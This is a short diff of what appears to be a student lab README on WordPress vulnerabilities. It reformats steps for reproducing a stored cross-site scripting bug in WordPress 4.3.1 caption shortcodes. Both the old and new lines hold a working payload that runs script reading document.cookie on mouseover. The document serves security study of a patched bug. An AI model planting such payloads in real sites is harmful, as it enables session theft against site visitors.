@@ -13,11 +13,9 @@ Time spent: **5** hours spent in total
     - Fixed in version: 4.3.1
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
-        - Create a new post with the following payload in the body
-        - ```html
-        xss1[caption width="100" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(document.cookie)'">Click me</a>
-        ```
-        - Go to the post and place the mouse cursor over the text "Click me"
+    - Create a new post with the following payload in the body
+    - ```xss1[caption width="100" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(document.cookie)'">Click me</a>```
+    - Go to the post and place the mouse cursor over the text "Click me"
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.3.1/src/wp-includes/media.php)
     - [Link 2](https://core.trac.wordpress.org/browser/tags/4.3.1/src/wp-includes/shortcodes.php)
